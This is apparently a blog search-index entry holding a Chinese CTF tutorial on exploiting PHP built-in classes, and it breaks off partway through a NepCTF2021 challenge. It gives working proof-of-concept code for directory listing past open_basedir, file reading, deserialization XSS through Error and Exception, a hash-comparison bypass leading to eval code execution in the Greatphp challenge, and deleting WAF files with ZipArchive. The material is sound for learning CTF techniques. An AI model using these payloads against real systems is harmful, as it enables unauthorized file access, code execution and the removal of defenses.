<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>php原生类的利用</title>
      <link href="/2022/05/29/php%E5%8E%9F%E7%94%9F%E7%B1%BB/"/>
      <url>/2022/05/29/php%E5%8E%9F%E7%94%9F%E7%B1%BB/</url>
      
        <content type="html"><![CDATA[<h1 id="php原生类"><a href="#php原生类" class="headerlink" title="php原生类"></a><strong>php原生类</strong></h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php的内置类，即不需要在当前脚本写出，但也可以实例化的类</span><br></pre></td></tr></table></figure><p>可通过一个脚本寻找php中的原生类</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$classes</span> = <span class="title function_ invoke__">get_declared_classes</span>();</span><br><span class="line"><span class="keyword">foreach</span> (<span class="variable">$classes</span> <span class="keyword">as</span> <span class="variable">$class</span>) &#123;</span><br><span class="line">    <span class="variable">$methods</span> = <span class="title function_ invoke__">get_class_methods</span>(<span class="variable">$class</span>);</span><br><span class="line">    <span class="keyword">foreach</span> (<span class="variable">$methods</span> <span class="keyword">as</span> <span class="variable">$method</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">in_array</span>(<span class="variable">$method</span>, <span class="keyword">array</span>(</span><br><span class="line">            <span class="string">&#x27;__destruct&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;__toString&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;__wakeup&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;__call&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;__callStatic&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;__get&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;__set&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;__isset&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;__unset&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;__invoke&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;__set_state&#x27;</span></span><br><span class="line">        ))) &#123;</span><br><span class="line">            <span class="keyword">print</span> <span class="variable">$class</span> . <span class="string">&#x27;::&#x27;</span> . <span class="variable">$method</span> . <span class="string">&quot;\n&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/002845eb7a1649d1905f6ac91932c21e.png" alt="在这里插入图片描述"></p><p>比赛中常用的有以下几个</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">Error</span><br><span class="line">Exception</span><br><span class="line">SoapClient</span><br><span class="line">DirectoryIterator</span><br><span class="line">Filesystemlterator</span><br><span class="line">SimpleXMLElement</span><br></pre></td></tr></table></figure><p>按照用途可分为以下几个</p><h2 id="遍历目录"><a href="#遍历目录" class="headerlink" title="遍历目录"></a>遍历目录</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">DirectoryIterator 类</span><br><span class="line">FilesystemIterator 类</span><br><span class="line">GlobIterator 类</span><br></pre></td></tr></table></figure><p>查阅官方文档，可以发现</p><p><img src="https://cdn.jsdelivr.net/gh/gh0st-9/images@main/image/202210041004050.png" alt="image-20221004100450009"></p><p><strong>FilesystemIterator</strong>是<strong>DirectoryIterator</strong>的子类</p><p>在DirectoryIterator下有__toString()方法</p><p><img src="https://cdn.jsdelivr.net/gh/gh0st-9/images@main/image/202210041051216.png" alt="image-20221004105120134"></p><p><strong>demo</strong></p><p>这样会触发__toString() 方法，输出根目录下的第一个文件名</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$dirname</span> = <span class="keyword">new</span> <span class="built_in">DirectoryIterator</span>(<span class="string">&quot;/&quot;</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$dirname</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">//$RECYCLE.BIN</span></span><br></pre></td></tr></table></figure><p>通过foreach进行循环遍历可输出指定目录下所有文件名</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$dirname</span> = <span class="keyword">new</span> <span class="built_in">DirectoryIterator</span>(<span class="string">&quot;/&quot;</span>);</span><br><span class="line"><span class="keyword">foreach</span>(<span class="variable">$dirname</span> <span class="keyword">as</span> <span class="variable">$a</span>)&#123;</span><br><span class="line">    <span class="keyword">echo</span>(<span class="variable">$a</span>-&gt;<span class="title function_ invoke__">__toString</span>().<span class="string">&#x27;&lt;br&gt;&#x27;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/gh0st-9/images@main/image/202210041053346.png" alt="image-20221004105355269"></p><p>可以在本地再小小测试下</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(__file__);</span><br><span class="line"><span class="variable">$shell</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;shell&#x27;</span>];</span><br><span class="line"><span class="variable">$dir</span> = <span class="keyword">new</span> <span class="built_in">DirectoryIterator</span>(<span class="variable">$shell</span>);</span><br><span class="line"><span class="keyword">foreach</span>(<span class="variable">$dir</span> <span class="keyword">as</span> <span class="variable">$f</span>)&#123;</span><br><span class="line">    <span class="keyword">echo</span>(<span class="variable">$f</span>-&gt;<span class="title function_ invoke__">__toString</span>().<span class="string">&#x27;&lt;br&gt;&#x27;</span>); <span class="comment">//不加__toString()也可,因为echo时会自动调用</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/gh0st-9/images@main/image/202210041055870.png" alt="image-20221004105540790"></p><p>可以加上和glob协议的使用，可以更快速精准的查找</p><p>查找所有txt文件</p><p><img src="https://cdn.jsdelivr.net/gh/gh0st-9/images@main/image/202210041058300.png" alt="image-20221004105822213"></p><p><strong>FilesystemIterator</strong>用法和DirectoryIterator一样</p><p><strong>GlobIterator</strong>类与前两个类的用法也相似，只是GlobIterator 类支持直接通过模式匹配来寻找文件路径，相当于自身带有glob协议</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$dir</span> = <span class="keyword">new</span> <span class="built_in">GlobIterator</span>(<span class="string">&quot;/*txt*&quot;</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$dir</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//1.txt</span></span><br></pre></td></tr></table></figure><p>这三种遍历目录的方法可以无视<strong>open_basedir</strong>对目录的限制</p><h2 id="读取文件"><a href="#读取文件" class="headerlink" title="读取文件"></a>读取文件</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SplFileObject 类</span><br></pre></td></tr></table></figure><p>该类的构造方法可以构造一个新的文件对象用于后续的读取。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(__file__);</span><br><span class="line"><span class="variable">$context</span> = <span class="keyword">new</span> <span class="built_in">SplFileObject</span>(<span class="string">&#x27;/1.txt&#x27;</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$context</span>;</span><br></pre></td></tr></table></figure><p>但每次只能读取文件中的一行内容</p><p><img src="https://cdn.jsdelivr.net/gh/gh0st-9/images@main/image/202210041103402.png" alt="image-20221004110313338"></p><p>同样通过遍历可以读取所有内容</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$context</span> = <span class="keyword">new</span> <span class="built_in">SplFileObject</span>(<span class="string">&#x27;/1.txt&#x27;</span>);</span><br><span class="line"><span class="keyword">foreach</span>(<span class="variable">$context</span> <span class="keyword">as</span> <span class="variable">$f</span>)&#123;</span><br><span class="line">    <span class="keyword">echo</span>(<span class="variable">$f</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/gh0st-9/images@main/image/202210041104505.png" alt="image-20221004110427423"></p><p>一个有趣的东西</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">echo</span> (<span class="string">&#x27;system&#x27;</span>)(<span class="string">&#x27;whoami&#x27;</span>);</span><br></pre></td></tr></table></figure><p>相当于执行了<code>system(&#39;whoami&#39;)</code></p><h2 id="Error-x2F-Exception内置类进行-XSS"><a href="#Error-x2F-Exception内置类进行-XSS" class="headerlink" title="Error&#x2F;Exception内置类进行 XSS"></a>Error&#x2F;Exception内置类进行 XSS</h2><p><strong>Error类</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">1.php7</span><br><span class="line">2.开启报错</span><br></pre></td></tr></table></figure><p>Error类由于其内部的<code>__toString</code>方法，在php7环境下可能会存在XSS漏洞，在构造php反序列化过程中，如果有个POP链难以构造或者走不通，可以尝试XSS</p><p>测试</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$xss</span> = <span class="title function_ invoke__">unserialize</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;xss&#x27;</span>]);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$xss</span>;</span><br></pre></td></tr></table></figure><p><strong>poc</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$xss</span> = <span class="keyword">new</span> <span class="built_in">Error</span>(<span class="string">&quot;&lt;script&gt;alert(&#x27;This is a Error xss test!&#x27;)&lt;/script&gt;&quot;</span>);</span><br><span class="line"><span class="variable">$test</span> = <span class="title function_ invoke__">serialize</span>(<span class="variable">$xss</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(<span class="variable">$test</span>);  </span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/gh0st-9/images@main/image/202210041049324.png" alt="image-20221004104902256"></p><p><strong>Exception</strong>类</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">1.php5、7</span><br><span class="line">2.开启报错</span><br></pre></td></tr></table></figure><p>原理一样</p><p>测试</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$xss</span> = <span class="title function_ invoke__">unserialize</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;xss&#x27;</span>]);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$xss</span>;</span><br></pre></td></tr></table></figure><p><strong>poc</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$xss</span> = <span class="keyword">new</span> <span class="built_in">Exception</span>(<span class="string">&quot;&lt;script&gt;alert(&#x27;This is a Exception xss test!&#x27;)&lt;/script&gt;&quot;</span>);</span><br><span class="line"><span class="variable">$test</span> = <span class="title function_ invoke__">serialize</span>(<span class="variable">$xss</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(<span class="variable">$test</span>);  </span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/gh0st-9/images@main/image/202210041050313.png" alt="image-20221004105002244"></p><h2 id="Error-x2F-Exception内置类绕过哈希比较"><a href="#Error-x2F-Exception内置类绕过哈希比较" class="headerlink" title="Error&#x2F;Exception内置类绕过哈希比较"></a>Error&#x2F;Exception内置类绕过哈希比较</h2><p><strong>Error</strong> 是所有PHP内部错误类的基类。</p><p><img src="https://cdn.jsdelivr.net/gh/gh0st-9/images@main/image/202210041105289.png" alt="image-20221004110557213"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">属性</span><br><span class="line"></span><br><span class="line">message 错误消息内容</span><br><span class="line"></span><br><span class="line">code 错误代码</span><br><span class="line"></span><br><span class="line">file 抛出错误的文件名</span><br><span class="line"></span><br><span class="line">line 抛出错误的行数</span><br><span class="line"></span><br><span class="line">previous 之前抛出的异常</span><br><span class="line"></span><br><span class="line">string 字符串形式的堆栈跟踪</span><br><span class="line"></span><br><span class="line">trace 数组形式的堆栈跟踪</span><br></pre></td></tr></table></figure><p>**Exception **是所有异常的基类</p><p><img src="https://cdn.jsdelivr.net/gh/gh0st-9/images@main/image/202210041106331.png" alt="image-20221004110645251"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">属性</span><br><span class="line"></span><br><span class="line">message 异常消息内容</span><br><span class="line"></span><br><span class="line">code 异常代码</span><br><span class="line"></span><br><span class="line">file 抛出异常的文件名</span><br><span class="line"></span><br><span class="line">line 抛出异常在该文件中的行号</span><br><span class="line"></span><br><span class="line">previous 之前抛出的异常</span><br><span class="line"></span><br><span class="line">string 字符串形式的堆栈跟踪</span><br><span class="line"></span><br><span class="line">trace 数组形式的堆栈跟踪</span><br></pre></td></tr></table></figure><p>同样的，在这两个类里也有__toString 方法</p><p>看看会返回什么</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="built_in">Error</span>(<span class="string">&quot;test&quot;</span>,<span class="number">1</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$a</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">Error: test in D:\phpstudy_pro\WWW\lesson\10.php:2</span></span><br><span class="line"><span class="comment">Stack trace:</span></span><br><span class="line"><span class="comment">#0 &#123;main&#125;</span></span><br><span class="line"><span class="comment">*/</span></span><br></pre></td></tr></table></figure><p>可以发现返回了错误信息”test”和错误在哪行”2”,但是传入的错误代码”1”并没有被回显出来</p><p>看下面这个例子</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="built_in">Error</span>(<span class="string">&quot;payload&quot;</span>,<span class="number">1</span>);<span class="variable">$b</span> = <span class="keyword">new</span> <span class="built_in">Error</span>(<span class="string">&quot;payload&quot;</span>,<span class="number">2</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$a</span> === <span class="variable">$b</span>) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;a=b&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;a!=b&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">md5</span>(<span class="variable">$a</span>) === <span class="title function_ invoke__">md5</span>(<span class="variable">$b</span>)) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;md5后:a=b&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">sha1</span>(<span class="variable">$a</span>) === <span class="title function_ invoke__">sha1</span>(<span class="variable">$b</span>)) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;sha1后:a=b&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/gh0st-9/images@main/image/202210041109722.png" alt="image-20221004110918646"></p><p>所以可使用这两个类绕过哈希的判断，但是要注意的是<strong>Error</strong>类是从php7才开始引入的，而<strong>Exception</strong>类从php5就开始引入了</p><h3 id="2020-极客大挑战-Greatphp"><a href="#2020-极客大挑战-Greatphp" class="headerlink" title="[2020 极客大挑战]Greatphp"></a>[2020 极客大挑战]Greatphp</h3><p>题目源码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">SYCLOVER</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$syc</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$lover</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>( (<span class="variable language_">$this</span>-&gt;syc != <span class="variable language_">$this</span>-&gt;lover) &amp;&amp; (<span class="title function_ invoke__">md5</span>(<span class="variable">$this</span>-&gt;syc) === <span class="title function_ invoke__">md5</span>(<span class="variable">$this</span>-&gt;lover)) &amp;&amp; (<span class="title function_ invoke__">sha1</span>(<span class="variable">$this</span>-&gt;syc)=== <span class="title function_ invoke__">sha1</span>(<span class="variable">$this</span>-&gt;lover)) )&#123;</span><br><span class="line">           <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/\&lt;\?php|\(|\)|\&quot;|\&#x27;/&quot;</span>, <span class="variable">$this</span>-&gt;syc, <span class="variable">$match</span>))&#123;</span><br><span class="line">               <span class="keyword">eval</span>(<span class="variable language_">$this</span>-&gt;syc);</span><br><span class="line">           &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">               <span class="keyword">die</span>(<span class="string">&quot;Try Hard !!&quot;</span>);</span><br><span class="line">           &#125;</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;great&#x27;</span>]))&#123;</span><br><span class="line">    <span class="title function_ invoke__">unserialize</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;great&#x27;</span>]);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>一个经典的哈希值判断绕过题，使用Error&#x2F;Exception类绕过</p><p>因为过滤了小括号，导致无法使用函数，可以用include直接包含&#x2F;flag;过滤了引号，可以用url取反绕过</p><p><strong>POC</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">SYCLOVER</span> </span>&#123;</span><br><span class="line"><span class="keyword">public</span> <span class="variable">$syc</span>;</span><br><span class="line"><span class="keyword">public</span> <span class="variable">$lover</span>;</span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line"><span class="keyword">if</span>( (<span class="variable language_">$this</span>-&gt;syc != <span class="variable language_">$this</span>-&gt;lover) &amp;&amp; (<span class="title function_ invoke__">md5</span>(<span class="variable">$this</span>-&gt;syc) === <span class="title function_ invoke__">md5</span>(<span class="variable">$this</span>-&gt;lover)) &amp;&amp; (<span class="title function_ invoke__">sha1</span>(<span class="variable">$this</span>-&gt;syc)=== <span class="title function_ invoke__">sha1</span>(<span class="variable">$this</span>-&gt;lover)) )&#123;</span><br><span class="line">   <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/\&lt;\?php|\(|\)|\&quot;|\&#x27;/&quot;</span>, <span class="variable">$this</span>-&gt;syc, <span class="variable">$match</span>))&#123;</span><br><span class="line">   <span class="keyword">eval</span>(<span class="variable language_">$this</span>-&gt;syc);</span><br><span class="line">   &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">   <span class="keyword">die</span>(<span class="string">&quot;Try Hard !!&quot;</span>);</span><br><span class="line">   &#125;</span><br><span class="line">   </span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$str</span> = <span class="string">&quot;?&gt;&lt;?=include~&quot;</span>.<span class="title function_ invoke__">urldecode</span>(<span class="string">&quot;%D0%99%93%9E%98&quot;</span>).<span class="string">&quot;?&gt;&quot;</span>;</span><br><span class="line"><span class="variable">$a</span>=<span class="keyword">new</span> <span class="built_in">Error</span>(<span class="variable">$str</span>,<span class="number">1</span>);<span class="variable">$b</span>=<span class="keyword">new</span> <span class="built_in">Error</span>(<span class="variable">$str</span>,<span class="number">2</span>);</span><br><span class="line"><span class="variable">$c</span> = <span class="keyword">new</span> <span class="title function_ invoke__">SYCLOVER</span>();</span><br><span class="line"><span class="variable">$c</span>-&gt;syc = <span class="variable">$a</span>;</span><br><span class="line"><span class="variable">$c</span>-&gt;lover = <span class="variable">$b</span>;</span><br><span class="line"><span class="keyword">echo</span>(<span class="title function_ invoke__">urlencode</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$c</span>)));</span><br></pre></td></tr></table></figure><p>在$str前面再加上一个<code>?&gt;</code>是因为Exception 类与 Error 的 __toString 方法在eval()函数中输出的结果是不可能控的，即输出的报错信息中，payload前面还有一段无用的信息”Error:……”所以要先用?&gt;闭合一下，变成<code>eval(&quot;...Error: ?&gt;&lt;?php shell ?&gt;&quot;)</code>，这样才能成功执行命令</p><h2 id="ZipArchive-类删除文件"><a href="#ZipArchive-类删除文件" class="headerlink" title="ZipArchive 类删除文件"></a>ZipArchive 类删除文件</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ZipArchive类是PHP的一个原生类，它是在PHP 5.20之后引入的。ZipArchive类可以对文件进行压缩与解压缩处理</span><br></pre></td></tr></table></figure><p>ZipArchive类中存在一个<strong>open</strong>方法</p><p><img src="https://cdn.jsdelivr.net/gh/gh0st-9/images@main/image/202210041110028.png" alt="image-20221004111056943"></p><p>可以看到，如果设置flags参数的值为 ZipArchive::OVERWRITE 的话，可以把指定文件删除</p><p>所以在做题时可以利用ZipArchive类调用open方法删除掉waf文件</p><h3 id="NepCTF2021-梦里花开牡丹亭"><a href="#NepCTF2021-梦里花开牡丹亭" class="headerlink" title="NepCTF2021 梦里花开牡丹亭"></a>NepCTF2021 梦里花开牡丹亭</h3><p>源码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&#x27;shell.php&#x27;</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Game</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span>  <span class="variable">$username</span>;</span><br><span class="line">    <span class="keyword">public</span>  <span class="variable">$password</span>;</span><br><span class="line">    <span class="keyword">public</span>  <span 